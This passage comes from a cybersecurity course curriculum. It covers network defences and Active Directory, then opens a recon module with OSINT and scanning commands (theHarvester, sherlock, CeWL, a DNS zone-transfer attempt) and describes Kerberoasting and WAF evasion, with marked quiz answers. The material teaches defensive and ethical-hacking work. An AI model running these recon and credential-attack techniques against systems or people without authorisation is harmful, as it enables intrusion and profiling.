- Limitations: slows internet speed due to encryption overhead; some providers log user data despite policy claims; quality services usually require a paid subscription

**Resources:**

- [Cisco Networking Academy](https://www.netacad.com) _(platform)_
- [NIST SP 800-77 (IPsec VPN Guide)](https://csrc.nist.gov/pubs/sp/800/77/r1/final) _(link)_

**Quick Quiz:**

1. A Site-to-Site VPN is used to:
   - Connect an individual remote employee to the office
   - **Permanently link two office networks together over the internet** ✓
   - Replace DNS resolution
   - Encrypt only DNS traffic
   > Site-to-Site VPNs create a permanent encrypted link between two office networks, as opposed to Remote Access VPN for individual users.
2. What is the general flow of a Remote Access VPN connection?
   - **Connect to VPN server, encrypt traffic, travel securely, server forwards to destination, response returns via tunnel** ✓
   - Connect directly to the destination with no encryption
   - Traffic is sent in plaintext through a proxy
   - DNS resolves the VPN server without any tunnel
   > This is the described flow: the client connects to the VPN server, traffic is encrypted through the tunnel, then forwarded to its destination and back.
3. Corporate VPNs are commonly required for which of these use cases?
   - **Connecting to TryHackMe/HackTheBox lab networks** ✓
   - Viewing static HTML files locally
   - Compiling source code
   - Formatting a hard drive
   > Both TryHackMe and HackTheBox require a VPN connection to reach their isolated lab networks, mirroring corporate remote-access VPN use.

#### 79. Active Directory - Structure, Users, Groups, GPO, Trust Relationships `[theory]` — Week 6

Active Directory is Microsoft's directory service for centrally managing users, computers, and permissions across an entire corporate Windows network — and it is also the single highest-value target in most corporate pentests, because owning the domain means owning almost everything joined to it. In an office with hundreds of employees sharing computers, printers, and file servers, that same centralization is what makes AD valuable day to day: administrators create accounts and assign roles, automatically grant or restrict access to shared folders, printers, or applications based on job role, and reset passwords or disable an account entirely from a single central control panel the moment an employee leaves — automating that provisioning and de-provisioning is what saves IT staff time and is exactly why compromising the domain controller compromises everything at once. Attackers go after it directly: password attacks (brute force or phishing) steal credentials outright, while Kerberoasting requests service tickets for service accounts from AD and cracks them offline with tools like Hashcat or John the Ripper to recover a service account's password without ever touching a login prompt. Once inside, misconfigured Access Control Lists (ACLs) are a favorite privilege-escalation path — attackers manipulate them to gain unauthorized access to data or elevate their privileges within the network. Defenders watch for unusual login attempts and unauthorized account/group changes, and harden the environment with strong password policies, MFA, and regular access audits — while red teams run simulated attacks against AD specifically to find these weaknesses before real attackers do.

**Key Points:**

- Analogy: AD = receptionist, login = authentication (badge), access = authorization (restricted floors)
- Structure: Domains → Trees → Forests, with Organizational Units (OUs) grouping users/computers
- Group Policy Objects (GPOs) push centralised security/config settings to domain-joined machines
- Kerberoasting: attackers request service tickets for AD service accounts, then crack them offline with tools like Hashcat or John the Ripper to recover the account's password
- Access Control Lists (ACLs) specify which users/groups can read, write, or modify AD data — misconfigured ACLs let attackers gain unauthorized access, and manipulating ACLs enables privilege escalation
- Signs of a breach: unusual/unexpected login attempts, and unauthorized modifications to user accounts or group memberships
- Defenses: strong password policies with regular changes, Multi-Factor Authentication (MFA) beyond just passwords, and regular audits of accounts/permissions to catch anomalies
- Offensive security practice: red teaming exercises simulate real attacks against AD to find weaknesses before attackers do, backed by continuous monitoring of AD-related activity
- Why AD is used, as named categories: Centralized Management (users/computers/policies from one place), Authentication & Authorization (only the right people reach specific resources), Scalability (organizing resources into domains, trees, and forests as the organization grows), and Security (access controls plus activity monitoring for compliance)
- Example use case: in an office with hundreds of employees sharing computers, printers, and file servers, administrators use AD to create accounts and assign roles, automatically grant or restrict access to shared folders/printers/applications by job role, and reset passwords or disable accounts the moment an employee leaves — all from one central control panel
- Benefit — Simplified Administration: automating user provisioning (creating accounts) and de-provisioning (removing accounts) saves time for IT staff
- Benefit — Scalability: AD can grow with the organization, handling hundreds or thousands of users without issues

**Resources:**

- [Microsoft Active Directory Domain Services documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ad-ds-getting-started) _(link)_
- [BloodHound documentation](https://bloodhound.readthedocs.io) _(tool)_
- [TryHackMe AD Basics](https://tryhackme.com) _(platform)_

**Quick Quiz:**

1. In the AD analogy given, what does 'login' represent?
   - Authorization
   - **Authentication (the badge check)** ✓
   - A Group Policy Object
   - A forest
   > In the receptionist analogy, login represents authentication (proving identity), while access represents authorization.
2. What is the hierarchical structure of Active Directory, from smallest to largest scope?
   - Forests, then Trees, then Domains
   - **Domains, then Trees, then Forests** ✓
   - OUs, then Forests, then Domains
   - Groups, then Forests, then Trees
   > AD's structure builds from Domains up to Trees and then Forests, with OUs grouping objects within a domain.
3. What is the significance of 'Domain Admin' in a corporate pentest?
   - It is an irrelevant, low-value account
   - **It is typically the classic highest-value goal since it grants control over the entire domain** ✓
   - It refers only to a DNS setting
   - It is a synonym for a DMZ
   > Active Directory is the highest-value target in most corporate pentests, with Domain Admin being the classic ultimate goal.

#### 80. Zero Trust Architecture (never trust, always verify) `[theory]` — Week 6

Zero Trust assumes no user or device is trusted by default, even inside the traditional network perimeter — 'never trust, always verify.' The clearest picture of it: going through an airport doesn't grant unrestricted access just because you're past the front doors — you're re-verified at the ticket counter, at security screening, and again at the boarding gate; even airline staff and crew go through security; and passengers can't reach the cockpit or cargo hold without specific permission. Micro-segmentation is the technical version of that same idea: it creates logical boundaries around specific workloads, apps, or data, each with its own access policy, so an attacker who gains an initial foothold can't move freely across the rest of the network. Real-time monitoring rounds out the third pillar, continuously watching user behavior for anomalies alongside IAM and micro-segmentation. Real deployments lean on IAM tooling to authenticate/authorize every request, name Palo Alto Prisma Access, Okta Identity Cloud, and Microsoft Azure Active Directory (Entra ID) as example tools, and face real adoption friction: the complexity of gaining full visibility, user resistance to workflow changes, and painful integration with legacy systems.

**Key Points:**

- Key principles: Always Verify, Least Privilege Access, Assume Breach
- Airport analogy: every checkpoint (ticket counter, security screening, boarding gate) re-verifies identity, even staff/crew go through security, and passengers can't reach restricted zones (cockpit/cargo) without specific permission
- Components: IAM (authenticate/authorize every request), Micro-Segmentation (limits lateral movement), Real-Time Monitoring
- Micro-segmentation mechanism: creates logical boundaries around specific workloads/applications/data with their own access policies, preventing an attacker who gains initial access from moving freely across the network
- Real-Time Monitoring (the third ZTA component alongside IAM and Micro-Segmentation): continuously monitors user behavior for anomalies
- Named tools in practice: Palo Alto Networks Prisma Access, Okta Identity Cloud, Microsoft Azure Active Directory (Entra ID)
- Adoption challenges: complexity from the visibility needed to transition, user resistance to workflow changes, and difficult integration with legacy systems
- Real-world sectors applying ZTA: healthcare (secures patient data while enabling telehealth), financial services (protects sensitive data with strict controls), education (secure access to learning resources)

**Resources:**

- [NIST SP 800-207 (Zero Trust Architecture)](https://csrc.nist.gov/pubs/sp/800/207/final) _(link)_
- [Microsoft Zero Trust documentation](https://learn.microsoft.com/en-us/security/zero-trust/) _(link)_

**Quick Quiz:**

1. Which principle is central to Zero Trust?
   - Trust all devices inside the perimeter by default
   - **Never trust, always verify -- even for requests inside the traditional perimeter** ✓
   - Only verify external requests
   - Disable all authentication for speed
   > Zero Trust assumes no user/device is trusted by default, re-verifying every request regardless of network location.
2. Micro-segmentation in a Zero Trust model primarily helps by:
   - Increasing broadcast domains
   - **Limiting lateral movement if a device/account is compromised** ✓
   - Removing the need for IAM
   - Disabling real-time monitoring
   > Micro-segmentation restricts communication between individual workloads/segments, limiting how far an attacker can move laterally.
3. Which of these is named as a real Zero Trust tool/platform?
   - Wireshark
   - **Okta Identity Cloud** ✓
   - Nmap
   - Hashcat
   > Okta Identity Cloud, along with Palo Alto Prisma Access and Microsoft Entra ID, is named as a real Zero Trust tool in this topic.

#### 81. Endpoint Security (EDR, AV, Defender) `[theory]` — Week 6

Endpoint security software runs directly on user devices/servers, providing the last line of defence once traffic has already reached the host. Traditional antivirus is signature-based and only catches known malware. EDR (Endpoint Detection and Response) goes further: it continuously collects data from every endpoint — processes, network connections, user behavior — analyses it in real time against indicators of compromise (IOCs) and indicators of attack (IOAs), and can automatically alert the security team, isolate the affected endpoint, and start remediation without a human in the loop. A concrete example: an employee downloads a malicious file, EDR notices it behaving like ransomware (attempting to encrypt data), isolates that one endpoint immediately, and hands the security team detailed logs to investigate — containing the incident before it spreads. Microsoft Defender is the named enterprise example: it draws on threat intelligence built from 78 trillion signals and input from over 10,000 security experts worldwide, integrates with Microsoft Defender XDR, Microsoft Sentinel, and Microsoft Security Copilot for extended response, and plugs into Azure, Office 365, and Intune for centralized enterprise management.

**Key Points:**

- Traditional AV: signature-based detection of known malware
- EDR (Endpoint Detection and Response): continuously gathers/analyses endpoint data in real time, detects behaviour traditional AV misses, can isolate an infected endpoint automatically
- How EDR works: Continuous Data Collection (processes, network connections, user behaviors) → Real-Time Analysis (detects IOCs/IOAs as they happen) → Automated Threat Response (alerts, isolates, remediates without needing human intervention)
- Concrete example: an employee downloads a malicious file, EDR detects the unusual behavior (e.g. attempting to encrypt data), isolates the infected endpoint, and provides detailed logs for investigation
- Microsoft Defender's Continuous Threat Intelligence: built from 78 trillion signals and insights from over 10,000 experts worldwide
- Microsoft Defender integrates with Defender XDR, Microsoft Sentinel, and Microsoft Security Copilot to extend incident response, and with Azure/O365/Intune for centralized enterprise management

**Resources:**

- [Microsoft Defender for Endpoint documentation](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/) _(link)_
- [MITRE ATT&CK](https://attack.mitre.org) _(link)_

**Quick Quiz:**

1. How does EDR differ from traditional signature-based antivirus?
   - EDR only works offline
   - **EDR continuously gathers/analyses endpoint data in real time and can detect behaviour signature-based AV misses** ✓
   - EDR is slower and less capable than AV
   - EDR cannot isolate an infected endpoint
   > EDR provides continuous behavioural monitoring and can automatically isolate an infected endpoint, unlike static signature-based AV.
2. Microsoft Defender integrates with which enterprise management tools?
   - **Azure/O365/Intune** ✓
   - Wireshark and Nmap
   - GTFOBins
   - BloodHound
   > Microsoft Defender integrates with Azure, Office 365, and Intune for centralised enterprise management.
3. Traditional antivirus primarily relies on:
   - **Signature-based detection of known malware** ✓
   - Zero Trust micro-segmentation
   - VLAN tagging
   - TLS handshakes
   > Traditional AV detects malware by matching against known signatures, unlike EDR's behavioural approach.

#### 82. Intrusion Detection & Prevention (IDS/IPS) - Signature vs Anomaly `[theory]` — Week 6

IDS/IPS monitor network traffic for malicious patterns — an IDS alerts, an IPS can also actively block the traffic in real time.

**Key Points:**

- Signature-based detection: matches traffic against a database of known-bad patterns (fast, but misses novel attacks)
- Anomaly-based detection: flags deviations from a baseline of 'normal' behaviour (catches novel attacks, higher false-positive rate)
- IDS = passive/alerting only; IPS = sits inline and can actively drop malicious traffic

**Resources:**

- [Snort documentation](https://www.snort.org) _(tool)_
- [Suricata documentation](https://docs.suricata.io) _(tool)_

**Quick Quiz:**

1. What is the key operational difference between an IDS and an IPS?
   - IDS actively blocks traffic; IPS only alerts
   - **IDS passively alerts; IPS sits inline and can actively block malicious traffic** ✓
   - They are functionally identical
   - IDS only works on wireless networks
   > IDS is passive/alerting only, while IPS sits inline in the traffic path and can actively drop malicious traffic.
2. Anomaly-based detection's main drawback compared to signature-based detection is:
   - It cannot detect novel attacks
   - **It has a higher false-positive rate since it flags deviations from a baseline** ✓
   - It requires no baseline at all
   - It is identical to signature-based detection
   > Anomaly-based detection catches novel attacks by flagging deviations from normal behaviour but tends to generate more false positives.
3. Signature-based detection's primary weakness is:
   - It cannot match known-bad patterns
   - **It misses novel/unknown attacks not yet in its database** ✓
   - It is slower than anomaly-based detection
   - It requires no database at all
   > Signature-based detection is fast but only matches known patterns, meaning novel attacks can slip through undetected.

#### 83. Web Application Firewall (WAF) & Next-Gen Firewall (NGFW) `[theory]` — Week 6

A firewall in general is a network security device or software that monitors and controls incoming and outgoing network traffic based on predetermined security rules, establishing a barrier between a trusted internal network and untrusted external networks such as the internet; firewalls can be hardware-based, software-based, or a combination of both, and the family includes Packet Filtering Firewalls, Stateful Inspection Firewalls, Proxy Firewalls (Application Gateways), Next-Generation Firewalls (NGFW), Network Address Translation (NAT) Firewalls, and Web Application Firewalls (WAF) — the latter two are the focus here. A WAF specifically inspects HTTP/HTTPS payloads and sits in front of a web application as a reverse proxy — a shield between the app and external traffic — guarding against cross-site scripting (XSS), SQL injection, and cross-site request forgery (CSRF), and it can be reconfigured on the fly (e.g. flipping on rate-limiting mid-DDoS attack). WAFs come in three deployment flavors: network-based (hardware, low latency, costly), host-based (built into the app, customizable, consumes local resources), and cloud-based (affordable, minimal setup) — and they filter traffic using a blocklist (deny known-bad, negative security model), an allowlist (permit only pre-approved, positive security model), or a hybrid of both. An NGFW is the broader evolution of the traditional firewall: it folds deep packet inspection (DPI), intrusion prevention (IPS), and application-awareness into one appliance, and sophisticated models can even decrypt HTTPS traffic to inspect the payload — catching hidden threats a basic packet-header firewall would miss entirely.

**Key Points:**

- General firewall definition: a network security device/software that monitors and controls incoming/outgoing traffic based on predetermined security rules, forming a barrier between a trusted internal network and untrusted external networks (e.g. the internet); firewalls can be hardware-based, software-based, or a combination of both
- The full firewall family named in this material: Packet Filtering Firewall, Stateful Inspection Firewall, Proxy Firewall (Application Gateway), Next-Generation Firewall (NGFW), Network Address Translation (NAT) Firewall, and Web Application Firewall (WAF)
- WAF sits in front of web apps as a reverse proxy — a shield between the app and external traffic — blocking malicious requests before they reach the app server
- WAF specifically guards against cross-site scripting (XSS), SQL injection, and cross-site request forgery (CSRF), and can be quickly reconfigured (e.g. enabling rate limiting during a DDoS attack)
- Three WAF deployment models: network-based (hardware, low latency, costly), host-based (built into the app software, customizable, uses local resources), cloud-based (affordable, minimal upfront cost)
- WAF operating models: blocklist/negative security (denies known threats), allowlist/positive security (permits only pre-approved traffic), or a hybrid of both
- NGFW combines deep packet inspection (DPI), intrusion prevention (IPS), and application-awareness in one appliance
- Sophisticated NGFWs can decrypt encrypted HTTPS traffic to perform deep packet inspection, catching threats a basic packet-header firewall would miss
- Both are commonly bypassed via encoding/obfuscation tricks covered in the OWASP Top 10 modules

**Resources:**

- [OWASP - Web Application Firewall](https://owasp.org/www-community/Web_Application_Firewall) _(link)_
- [ModSecurity](https://github.com/SpiderLabs/ModSecurity) _(tool)_

**Quick Quiz:**

1. A Web Application Firewall (WAF) specifically inspects:
   - Only Layer 2 MAC addresses
   - **HTTP/HTTPS payloads for patterns like SQLi/XSS** ✓
   - Only DNS queries
   - Physical cabling
   > A WAF sits in front of web apps specifically inspecting HTTP/HTTPS traffic for malicious patterns like SQL injection and XSS.
2. How does an NGFW differ from a traditional firewall?
   - NGFW only filters by port number
   - **NGFW combines deep packet inspection, IPS, and application-awareness, and can inspect encrypted HTTPS traffic** ✓
   - NGFW cannot inspect any traffic
   - NGFW is only used for DNS
   > NGFWs add deep packet inspection, IPS, and application-layer awareness beyond a traditional packet-filtering firewall.
3. What is a common way attackers attempt to bypass a WAF?
   - **Using encoding/obfuscation tricks on the payload** ✓
   - Disabling their own browser
   - Using a VPN only
   - Sending fewer requests
   > Encoding or obfuscating malicious payloads is a classic technique to slip past WAF/NGFW pattern matching.

#### 84. VDI (Virtual Desktop Infrastructure) `[theory]` — Week 6

VDI hosts desktop environments on centralized servers and streams them to end-user devices, keeping data on the server rather than the endpoint. The named stack: centralized servers in a data center, a hypervisor (VMware vSphere or Microsoft Hyper-V) that creates and manages the virtual machines the desktops run on, a connection broker that finds and allocates a virtual desktop from the resource pool for each user, the client device itself (a PC, tablet, or thin client), and a remote display protocol (RDP, PCoIP, or HDX) that streams the desktop experience to that client. Real deployments cite BYOD support (diverse personal devices without compromising security, since data never leaves the server), and name VMware Horizon (integrated encryption + MFA) and Oracle VirtualBox (free/open-source, more common for dev/test than production VDI) as example platforms. The tradeoff: real upfront cost in infrastructure/licensing/training, and network latency can make the experience feel sluggish if the network isn't properly planned.

**Key Points:**

- Key components: Centralized Servers, Hypervisor (VMware vSphere/Microsoft Hyper-V), Connection Broker, Client Device (PC/tablet/thin client), Remote Display Protocol (RDP, PCoIP, HDX)
- BYOD (Bring Your Own Device): VDI supports diverse personal devices without compromising security, since sensitive data stays on the server
- Benefits: remote work enablement, BYOD support, centralized IT management, data stays on the server, easier scalability up/down based on demand
- Use cases: healthcare (telehealth/EHR), financial services (compliance), education
- Challenges: significant upfront investment in infrastructure/software licenses/staff training; network latency can degrade user experience if connections are slow/unstable
- Named platforms: VMware Horizon (integrated encryption + multi-factor authentication) and Oracle VirtualBox (free/open-source, typically used for dev/test rather than production VDI)

**Resources:**

- [VMware Horizon documentation](https://docs.vmware.com/en/VMware-Horizon/index.html) _(link)_
- [Microsoft Azure Virtual Desktop documentation](https://learn.microsoft.com/en-us/azure/virtual-desktop/) _(link)_

**Quick Quiz:**

1. What is a core security benefit of VDI (Virtual Desktop Infrastructure)?
   - **Data stays on the server rather than the endpoint device** ✓
   - It eliminates the need for a hypervisor
   - It requires no connection broker
   - It disables Group Policy
   > VDI centrally hosts desktops on servers and streams them to endpoints, keeping sensitive data on the server side rather than on potentially insecure endpoint devices.
2. Which of the following is a named VDI component responsible for managing user connections to virtual desktops?
   - **Connection Broker** ✓
   - WAF
   - DMZ
   - VLAN tag
   > The Connection Broker manages and directs user sessions to the appropriate virtual desktop instance.
3. Which remote display protocol is mentioned as used by VDI solutions?
   - SMTP
   - **PCoIP** ✓
   - FTP
   - SNMP
   > PCoIP, along with RDP and HDX, is named as a remote display protocol used to stream VDI sessions to end-user devices.

#### 85. Lab: Design a corporate network diagram in draw.io `[lab]` — Week 6

Design a segmented corporate network diagram incorporating everything covered in this module — a 3-legged-firewall DMZ (separate internet-facing, internal-facing, and DMZ-facing interfaces) hosting a public web server, internal VLANs, an AD domain controller, and Zero Trust controls — following the same traffic-flow rules from the DMZ material: Internet→DMZ allowed, DMZ→Internal strictly restricted, Internal→DMZ allowed for administration, Internet→Internal blocked.

**Key Points:**

- Include: internet edge firewall with 3 interfaces (internet / internal LAN / DMZ), a DMZ hosting a public web server, internal VLANs (HR/IT/Finance) with VLAN IDs, an AD domain controller
- Label every security control (firewall, IDS/IPS, WAF) at the point in the diagram where it sits
- Show traffic-flow arrows matching the DMZ rules: Internet→DMZ allowed, DMZ→Internal strictly restricted, Internal→DMZ allowed (admin), Internet→Internal blocked
- Other services worth placing in the DMZ: mail server (SMTP), DNS server, VPN gateway, reverse proxy/load balancer
- Annotate Zero Trust controls: IAM/MFA at the access edge and micro-segmentation boundaries between VLANs

**Resources:**

- [draw.io](https://app.diagrams.net) _(tool)_
- [Cisco Networking Academy](https://www.netacad.com) _(platform)_

**Quick Quiz:**

1. In this lab's corporate network diagram, where should the AD domain controller typically be placed?
   - In the DMZ alongside the public web server
   - **On the internal network, connected to the internal VLANs** ✓
   - Directly exposed to the internet
   - Outside the firewall entirely
   > The domain controller is a sensitive internal asset and should sit on the internal network, not the DMZ.
2. Why does the lab ask you to annotate traffic-flow arrows between zones?
   - To make the diagram colourful only
   - **To clearly show and justify which flows are allowed/blocked between zones** ✓
   - Arrows are required by draw.io syntax
   - To replace the need for a firewall
   > Labelling traffic flows demonstrates understanding of DMZ traffic rules -- which connections are permitted vs blocked between each zone.
3. Which element should be labelled at the point it sits in the diagram, per the lab instructions?
   - Only cable colours
   - **Every security control such as firewall, IDS/IPS, and WAF** ✓
   - Employee names
   - Software license keys
   > The lab explicitly asks for every security control (firewall, IDS/IPS, WAF) to be labelled at its position in the diagram.


---

## M7: Ethical Hacking Lifecycle & Recon

**Month 2** · Weeks 6-7 · 12 topics

The first two phases of every real engagement — reconnaissance and scanning — done properly before a single exploit is ever attempted. This module covers OSINT tradecraft, active scanning with Nmap, vulnerability scanning with Nessus, and how to structure a professional pentest report.

**Learning Outcomes:**

- Walk through the 5 phases of ethical hacking end to end
- Perform passive OSINT recon using WHOIS, Shodan, Netcraft, and Google Dorking
- Run and interpret Nmap scans for host/port/service/OS discovery
- Run a Nessus vulnerability scan and triage the results
- Structure a professional penetration test report

**Module Resources:**

- [TryHackMe Nmap rooms](https://tryhackme.com) _(platform)_
- [Nessus Essentials (free)](https://www.tenable.com/products/nessus/nessus-essentials) _(tool)_
- [OSINT Framework](https://osintframework.com) _(link)_
- [Shodan](https://www.shodan.io) _(tool)_
- [Nmap official documentation](https://nmap.org/book/man.html) _(link)_

**Module Quiz (10 questions):**

1. Which two phases of the 5-phase hacking lifecycle does this module focus on in depth?
   - Gaining Access and Maintaining Access
   - **Reconnaissance and Scanning** ✓
   - Covering Tracks and Maintaining Access
   - Only Gaining Access
   > The module description states it covers Recon and Scanning deeply, while Access/Exploitation is covered in M9-M11.
2. Why should a pentester perform passive OSINT before any active Nmap scanning?
   - Passive OSINT is illegal so it must be done last
   - **Passive recon gathers intelligence without alerting the target, informing a more efficient/targeted active scan afterward** ✓
   - Active scanning must always come first per RoE
   - Passive OSINT replaces the need for authorization
   > Passive recon (WHOIS, Shodan, Google dorking) gathers information without touching the target, letting the pentester plan active scanning more effectively before it begins.
3. A scan reveals a service running vsftpd 2.3.4. What is the correct next professional step before attempting exploitation?
   - Immediately run an untested exploit against a production system with no authorization check
   - **Cross-reference the version against CVE Details/Exploit-DB to confirm a known vulnerability (e.g. CVE-2011-2523) and confirm it's within authorised scope** ✓
   - Ignore the finding since version detection is unreliable
   - Change the finding's severity to Critical without verification
   > The workflow in this module is to identify service versions via -sV, then research known CVEs, and always confirm the target is within the authorised Rules of Engagement scope.
4. Why does subdomain enumeration matter even if the main domain is already thoroughly hardened?
   - Subdomains are never in scope
   - **Subdomains often run older, forgotten, or less-hardened applications, significantly expanding the real attack surface** ✓
   - Subdomains cannot be scanned with subfinder/amass
   - Only the root domain can ever be vulnerable
   > Legacy or forgotten subdomains frequently run outdated, less-monitored applications, making them valuable additional attack surface.
5. What distinguishes a credentialed Nessus scan from a non-credentialed one, and why does it matter?
   - **Credentialed scans log into the target for deeper, more accurate visibility into installed software and misconfigurations, whereas non-credentialed scans only see externally visible signals** ✓
   - There is no practical difference
   - Non-credentialed scans are always more accurate
   - Credentialed scans cannot detect CVEs
   > Credentialed scans provide much deeper visibility (patch levels, local misconfigurations) than non-credentialed external-only scans.
6. Which statement correctly distinguishes vertical from horizontal privilege escalation?
   - **Vertical means gaining a higher privilege tier (e.g. user to admin); Horizontal means accessing another same-level user's data** ✓
   - Vertical means accessing another user's data; Horizontal means gaining admin rights
   - They are synonyms for the same concept
   - Both only apply to Windows systems
   > Vertical privesc raises your privilege level; horizontal privesc accesses peer data at the same privilege level -- both are conceptually introduced here and expanded hands-on in M11.
7. What is the primary purpose of the Executive Summary in a pentest report, as opposed to the Detailed Findings section?
   - To list every CVE with full technical PoC steps
   - **To communicate business risk and overall posture to a non-technical audience** ✓
   - To replace the need for CVSS scoring
   - To document Nmap command syntax
   > The Executive Summary is aimed at non-technical stakeholders, summarizing risk and impact, while Detailed Findings holds the technical depth.
8. Before conducting any active recon (e.g. an Nmap scan) against a client's systems, what is legally/ethically required?
   - Nothing -- active recon requires no special authorization since it's just scanning
   - **Explicit written authorisation and agreed Rules of Engagement must already be in place** ✓
   - Only a verbal green light from a random employee
   - Completion of the Nessus scan first
   > Because active recon directly touches the target and may be noticed, written authorisation and RoE must be established beforehand -- this is the line between a pentest and a crime.
9. A tester obtains a low-privilege foothold and notices a scheduled cron job runs as root. What broader post-exploitation category does exploiting this fall under, and what comes next in the lifecycle?
   - Reconnaissance; nothing further happens
   - **Privilege escalation (vertical) leading toward Maintaining Access/persistence if successful** ✓
   - Covering tracks only
   - Passive OSINT
   > Exploiting a misconfigured root cron job to escalate is vertical privilege escalation; successful post-exploitation often continues into establishing persistence (Maintaining Access).
10. Why does this module emphasize that Nmap's --script vuln output and Nessus findings both still require manual triage rather than blind trust?
   - **Because automated scanners can produce false positives/negatives, so findings must be verified and prioritised by an analyst before being included in a report** ✓
   - Because scanners are always 100% accurate
   - Because manual triage is illegal
   - Because Nessus and Nmap always agree with each other
   > Both --script vuln and vulnerability scanners can misfire, so results need human verification and risk-based prioritisation before being reported as confirmed findings.

### Topics

#### 86. 5 Phases of Hacking (Recon, Scanning, Access, Maintain, Cover Tracks) `[theory]` — Week 6

The classic 5-phase lifecycle every pentest and every real attack roughly follows — this course covers Recon and Scanning deeply here, Access/Exploitation in M9-M11, and touches Maintain/Cover Tracks conceptually. The source deck frames the whole point of phases 1-2 plainly: the outcome an attacker (or tester) is after is knowing three things — what software is running, who works for the company, and what systems are vulnerable — and everything in Footprinting and Scanning exists to answer those three questions before Gaining Access is even attempted.

**Key Points:**

- 1. Reconnaissance: gathering information (passive or active) before touching the target directly — the source deck describes this as building a 'blueprint' of the organization before deciding how to attack it
- 2. Scanning: the Network Scanning & Service Enumeration material frames this as a funnel — first identify live hosts ('knocking on doors to see who's home'), then open ports, then running services and versions
- 3. Gaining Access: exploiting a vulnerability to get a foothold, e.g. matching a discovered service version (like vsftpd 2.3.4) to a known CVE via CVE Details or Exploit-DB
- 4. Maintaining Access: persistence mechanisms to survive a reboot/reconnect
- 5. Covering Tracks: clearing logs/artefacts (only ever relevant in authorised red-team engagements)
- The source deck treats Reconnaissance as sometimes a subset of Footprinting and sometimes interchangeable with it — the practical distinction used in this course: Footprinting builds the general map, Reconnaissance narrows in on specific systems/vulnerabilities to act on
- Every phase from Scanning onward depends on first having established Rules of Engagement (RoE) with management — the source material gates all active techniques on this explicitly

**Resources:**

- [MITRE ATT&CK](https://attack.mitre.org) _(link)_
- [TryHackMe](https://tryhackme.com) _(platform)_

**Quick Quiz:**

1. Which phase comes immediately after Reconnaissance in the 5-phase model?
   - Gaining Access
   - **Scanning** ✓
   - Covering Tracks
   - Maintaining Access
   > The order is Reconnaissance, then Scanning, then Gaining Access, then Maintaining Access, then Covering Tracks.
2. 'Covering Tracks' is relevant in which context according to this course?
   - Every unauthorised attack
   - **Only within an authorised red-team engagement's agreed scope** ✓
   - Never, since it's illegal in all contexts
   - Only during passive OSINT
   > Covering tracks (clearing logs/artefacts) is only ever appropriate within an authorised, explicitly scoped red-team engagement.
3. Which phase involves exploiting a vulnerability to establish an initial foothold?
   - Reconnaissance
   - Scanning
   - **Gaining Access** ✓
   - Maintaining Access
   > 'Gaining Access' is the phase where a discovered vulnerability is actually exploited to obtain a foothold.

#### 87. Passive Recon - OSINT (WHOIS, Shodan, Google Dorks, LinkedIn, Netcraft) `[theory]` — Week 7

Passive footprinting gathers information without directly touching the target — 'spying from a distance' using public sources only, so the target never sees you. The source material's stated objective is to extract three categories of intelligence this way: Organization Information (employee details, partners, web tech, patents), Network Information (domains, subdomains, network blocks, WHOIS/DNS records), and System Information (OS, web server types/locations, exposed accounts) — all without a single packet touching the target directly.

**Key Points:**

- Shodan: search engine for internet-connected devices, e.g. hostname:"example.com"
- Netcraft: Site Report reveals subdomains, hosting, and OS fingerprinting — walkthrough is Resources -> Tools -> Site Report -> look up the domain -> click the Network section's domain link to see subdomains with netblock/OS info attached
- WHOIS: reveals registrar, nameservers, and organisation details for a domain
- Google Dorking: site:example.com filetype:pdf "confidential" plus operators like intitle:, allinurl:, inurl:, allintitle:, inanchor:, link:, related:, and info: find exposed data and cached pages
- Censys (search.censys.io): searching a hostname surfaces the host page with OS, protocols, software, and host keys — used specifically for passive OS fingerprinting without touching the box
- crt.sh (Certificate Transparency logs), DNSDumpster, and SecurityTrails (Subdomains tab plus historical A/AAAA/MX/NS/SOA/TXT records) are the named go-to sources for passive subdomain/DNS mapping
- Sherlock (sherlock <username>) hunts a known username across social platforms, while people-search services like PeekYou, Spokeo, pipl, Intelius cross a named employee against public records — both used for phishing/social-engineering-aware recon
- theHarvester gathers emails/employee names/subdomains/hosts from public sources (search engines, PGP key servers, SHODAN) for social-engineering-aware recon
- Recon-ng (modular OSINT framework): workspaces + modules like recon/domains-hosts/brute_hosts, recon/domains-contacts/whois_pocs, and recon/domains-hosts/hackertarget automate harvesting hosts, contacts, and subdomain/IP lists into an HTML report

```bash
site:example.com filetype:pdf "confidential"
theHarvester -d example.com -l 200 -b linkedin
nslookup
theHarvester -d microsoft.com -l 200 -b baidu
sherlock satyanadella
modules load recon/domains-hosts/hackertarget
```

**Resources:**

- [OSINT Framework](https://osintframework.com) _(link)_
- [Shodan](https://www.shodan.io) _(tool)_
- [Netcraft Site Report](https://sitereport.netcraft.com) _(tool)_

**Quick Quiz:**

1. Which tool is described as a search engine for internet-connected devices?
   - **Shodan** ✓
   - Netcraft
   - WHOIS
   - theHarvester
   > Shodan indexes internet-connected devices and can be searched with queries like hostname:'example.com'.
2. What information does a WHOIS lookup typically reveal?
   - Open ports on the target
   - **Registrar, nameservers, and organisation details for a domain** ✓
   - The exact source code of a website
   - Employee passwords
   > WHOIS reveals domain registration details such as registrar, nameservers, and the registering organisation.
3. Why is passive recon considered lower-risk than active recon?
   - It requires touching the target server directly
   - **It gathers information without directly interacting with/touching the target** ✓
   - It always requires written authorisation
   - It is illegal in every jurisdiction
   > Passive footprinting uses only public sources, so the target never directly sees the recon activity, unlike active recon.

#### 88. Active Recon (Nmap, Traceroute, Banner Grabbing) `[theory]` — Week 7

Active footprinting means directly interacting with the target — the target may notice this activity, so it must only ever be done with explicit authorisation and an agreed scope. The source material analogises this to knocking on doors in a neighborhood to see who's home; concretely it covers actively crawling/probing the target's own website and email infrastructure, not just its DNS/network layer — Photon crawling for URLs/files, CeWL building a password wordlist straight from site content, and eMailTrackerPro tracing an email's actual route back to its sender.

**Key Points:**

- Ping sweeps and traceroute map live hosts and the network path to a target
- Banner grabbing reveals exact service versions directly from their response headers/banners
- Photon (photon -u http://example.com -t 3 -l 2) crawls a target site and extracts URLs, files, and other information at a set thread count/crawl depth
- CeWL (cewl -d 2 -w passlist.txt http://example.com) spiders a site to a given depth and builds a wordlist from its content, later reused for password-cracking attacks against harvested accounts
- DNSRecon (dnsrecon -d example.com -t std) runs standard DNS checks directly against the target's DNS server; a zone transfer attempt (dig axfr example.com @ns1.example.com) only succeeds if the DNS server is misconfigured to allow it
- eMailTrackerPro actively traces email headers to identify sender IP/location and the route a message took — active because it depends on tracking artefacts the target's mail system generated
